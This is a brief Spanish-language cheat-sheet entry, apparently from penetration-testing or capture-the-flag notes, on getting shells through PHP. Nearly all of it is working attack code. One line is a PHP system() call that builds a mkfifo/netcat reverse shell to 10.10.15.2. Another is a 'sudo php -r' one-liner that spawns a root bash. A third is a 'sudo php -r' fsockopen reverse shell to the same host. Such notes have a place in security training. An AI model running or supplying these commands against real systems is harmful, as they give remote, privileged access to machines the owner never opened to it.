
---

para realizar una rever shell con php 
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.2 9999 >/tmp/f"); ?>
```

Si no hiciera falta una revert shell por estar ya dentro de la maquina podemos ejecutar:
```bash
sudo php -r "system('/bin/bash');"
```

o con revert shell
```shell
sudo php -r '$sock=fsockopen("10.10.15.2","9998");exec("/bin/sh -i <&3 >&3 2>&3");'
```